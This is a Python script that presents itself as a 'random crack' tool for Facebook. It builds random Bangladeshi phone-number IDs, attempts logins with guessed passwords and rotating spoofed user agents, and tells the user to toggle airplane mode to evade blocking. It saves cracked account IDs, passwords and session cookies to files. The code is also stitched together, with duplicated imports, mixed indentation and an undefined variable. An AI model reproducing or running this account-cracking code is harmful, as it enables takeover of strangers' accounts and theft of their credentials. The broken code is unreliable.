import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')

import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
P = '\x1b[1;97m' # 
M = '\033[1;31m' # 
H = '\033[1;32m' # 
K = '\x1b[1;97m' # 
B = '\x1b[1;97m' # 
U = '\x1b[1;95m' # 
O = '\x1b[1;97m' # 
N = '\x1b[0m'    # 
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
cp = []
id = []
user = []
loop = 0
oks = []
cps = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

ugen=[]
for x in range(100):
    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/600.1.4'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

agents = [
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109]",] 
logo ="""\033[1;32m  
           _____  _____  _______     __      _   _ 
     /\   |  __ \|  __ \|_   _\ \   / //\   | \ | |
    /  \  | |  | | |__) | | |  \ \_/ //  \  |  \| |
   / /\ \ | |  | |  _  /  | |   \   // /\ \ | . ` |
  / ____ \| |__| | | \ \ _| |_   | |/ ____ \| |\  |
 /_/    \_\_____/|_|  \_\_____|  |_/_/    \_\_| \_|
 
\033[1;32m===============================================================
\033[1;32m[-]\033[1;32mTOOLS     :\033[1;32m Random
\033[1;32m[-]\033[1;32mVERSION   :\033[1;32m Personal
\033[1;32m[-]\033[1;32mAUTHOR    :\033[1;32m ADRIYAN-KING
\033[1;32m[-]\033[1;32mGITHUB    :\033[1;32m ADRIYAN404
\033[1;32m[-]\033[1;32mTEAM      :\033[1;32m BAN
\033[1;32m===============================================================
'\033[1;32mTurn on & off flight (airplane) mode before use   
\033[1;32m==============================================================="""

def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r %s[%s!%s] %sSorry there is no Active Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r ðŸŽ®  %sYour Active Application Details :'%(H))
        for i in range(len(game)):
            print(f"\r %s%s. %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
def random_pak_number():
    user=[]
    os.system('clear')

loop = 0
oks = []
cps = []

#global functions
def dynamic(text):
	titik = ['.   ','..  ','... ','.... ']
	for o in titik:
		print('\r'+text+o),
		sys.stdout.flush();time.sleep(1)
def menu():
	os.system('clear')
	print(logo)
	print('[1] Random crack')
	print(47*"-")
	opt = input('[?] Choose : ')
	if opt =='1':
		random_crack()


def random_crack():
	os.system('clear')
	print(logo)
	print('[1] India Random coming....')
	print('[2] BD Random Uid Crack')
	print('[3] Pakistan Random Uid Crack')
	print('[0] Back')
	print(47*'-')
	opt = input('[?] Choose : ')
	if opt =='1':
		random_number()
	elif opt =='2':
		random_pak_number()
	elif opt =='0':
		menu()
	else:
		print('\033[1;91mChoose valid option\033[0;97m')
		random_crack()



def random_pak_number():
	user=[]
	os.system('clear')
	print(logo)
	print('[+] For BD, Enter Four Digit Code (0171)')
	print(47*'-')
	kode = input('[?] Input Code : ')
	print(47*'-')
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(7))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[+] Total Ids :\033[1;32m'+tl)
		print('\033[1;32m[$] ADRIYAN HAS BEEN STARTED...(\033[1;32mBANGLADESH\033[1;32m)');print(47*"-");print('    USE FLIGHT (\033[1;32mAIRPLANE\033[1;32m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [guru]
			yaari.submit(rcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	print(' Press Inter To Back Menu')
	menu()
    
def rcrack(uid,pwx,tl):
	global loop
	global oks
	global agents
	try:
		for ps in pwx:
            pro = random.choice(ugen)
            session = requests.Session()
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'www.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://www.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="95", "Chromium";v="95", ";Not A Brand";v="99"',
            "sec-ch-ua-mobile": '?1',
            "sec-ch-ua-platform": "Windows",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?0',
            "pragma": 'no-cache',
            "priority": 'u=0',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\033[1;35mA-A😌M-OK ' +cid+ ' | ' +ps+    '  \n\033[1;33mCOOKIES : \033[1;32m'+coki+  ' \033[0;96mUSER-AGENT : \033[0;90m'+pro+'  \033[0;90m')
                cek_apk(session,coki)
                open('/sdcard/AAM-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\33[1;33mA-A-M-CP  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/AAM-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
		loop+=1
		print(loop+len(self.id)+len(ok)+len(cp))
		sys.stdout.flush()
	except:
		pass
menu()
